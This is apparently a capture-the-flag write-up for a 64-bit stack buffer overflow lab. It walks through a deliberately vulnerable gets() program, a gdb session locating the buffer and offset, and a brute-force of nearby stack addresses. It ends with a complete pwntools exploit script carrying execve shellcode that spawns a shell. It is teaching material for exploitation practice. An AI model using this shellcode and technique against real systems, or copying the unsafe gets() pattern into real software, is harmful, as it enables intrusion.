The exploit I have here will most lijeky not work if it is copy and pasted without reconfiguring it. Let's take a look at the source code...

```
#include <stdio.h>
#include <string.h>

void nothing()
{
	char* buf0[50];
	gets(buf0);
}

int main()
{
	printf("There, now you have less than nothing. Yet you still try. Some would recogmedn a psychologist. I recogmend natural selection\n");
	nothing();
}
```

So looking at this code, it looks pretty similar to the previous challenge. In fact it is pretty much just a copy and paste of the last challenge. However it is missing one thing that made our lives easy. It is no longer printing out the address of the buffer, so we will have to find that ourselves. Now there are a lot of different methods you could go about finding the address. However that address changes for things such as running at a different privilege level, and if it is in gdb. What we can do for this instance is we can look at the address in gdb. This won't be the exact address, however using that address as a base we should be able to brute force the actual address. Let me show you.

```
gdb-peda$ disas nothing
Dump of assembler code for function nothing:
   0x0000000000400536 <+0>:	push   rbp
   0x0000000000400537 <+1>:	mov    rbp,rsp
   0x000000000040053a <+4>:	sub    rsp,0x190
   0x0000000000400541 <+11>:	lea    rax,[rbp-0x190]
   0x0000000000400548 <+18>:	mov    rdi,rax
   0x000000000040054b <+21>:	mov    eax,0x0
   0x0000000000400550 <+26>:	call   0x400420 <gets@plt>
   0x0000000000400555 <+31>:	nop
   0x0000000000400556 <+32>:	leave  
   0x0000000000400557 <+33>:	ret    
End of assembler dump.
gdb-peda$ b *nothing+31
Breakpoint 1 at 0x400555
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b5_64/b5_64 
There, now you have less than nothing. Yet you still try. Some would recogmedn a psychologist. I recogmend natural selection
75395128
```

One wall of text later...

```
Breakpoint 1, 0x0000000000400555 in nothing ()
gdb-peda$ x/s $rbp-0x190
0x7fffffffdcc0:	"75395128"
gdb-peda$ info frame
Stack level 0, frame at 0x7fffffffde60:
 rip = 0x400555 in nothing; saved rip = 0x400570
 called by frame at 0x7fffffffde70
 Arglist at 0x7fffffffde50, args: 
 Locals at 0x7fffffffde50, Previous frame's sp is 0x7fffffffde60
 Saved registers:
  rbp at 0x7fffffffde50, rip at 0x7fffffffde58
 ```

So as you can see the address of the buffer is stored at 0x7fffffffdcc0. The offset we will need to reach the rip register is 408 (0x7fffffffde98 - 0x7fffffffdd00 = 408). If we were to hardcode that address into our exploit the exploit will work, however only when we run it in gdb under the same settings. However if you notice something with all of the subsequent addresses, the are stored in 16 byte increments. If the address that we saw from gdb servers as a rough estimate, then we should be able to move up and down from 0x7fffffffdcc0 untill we find an address that works. Here is a list of the addresses I went through, before I found one that worked.

```
0x7fffffffdcc0
0x7fffffffdcb0
0x7fffffffdca0
0x7fffffffdc90
0x7fffffffdc80
0x7fffffffdc70
0x7fffffffdc60
0x7fffffffdc50
0x7fffffffdc40
0x7fffffffdc30
0x7fffffffdc20
0x7fffffffdc10
0x7fffffffdcd0
0x7fffffffdce0
0x7fffffffdcf0
```

And then I found the address that worked for me, 0x7fffffffdcf0. Here is my exploit script with the address hard coded in (yes it is the same script from the last challenge with one line changed). Keep in mind that we have to adjust the offset to make room for the shellcode, so it will be 408 - 27 = 381.

```
#Import the pwntools library.
from pwn import *

#The process is like an actualy command you run, so you will have to adjust the path if your exploit isn't in the same directory as the challenge.
target = process("./b5_64")

#Just receive the first line, which for our purposes isn't important.
target.recvline()

#Hardcode in the address of the buffer
address = "0x7fffffffdcf0"

#Convert the string to a hexidecimal
address = int(address, 16)

#Pack the hexidecimal in little endian for 32 bit systems
address = p64(address)

#Store the shellcode in a variable
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

#Make the filler to reach the eip register
filler = "0"*381

#Craft the payload
payload = shellcode + filler + address

#Send the payload
target.sendline(payload)

#Drop into interactive mode so you can use the shell
target.interactive()
````

Now let's try out the exploit...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b5_64$ python exploit.py 
[+] Starting local process './b5_64': Done
[*] Switching to interactive mode
$ ls
Readme.md  b5_64  b5_64.c  core  exploit.py  in  out  peda-session-b5_64.txt
$ cat out
If you don't stop trying to leave, we can't have a celebration for you. Level Cleared!

```

And just like that we pwned the binary. 
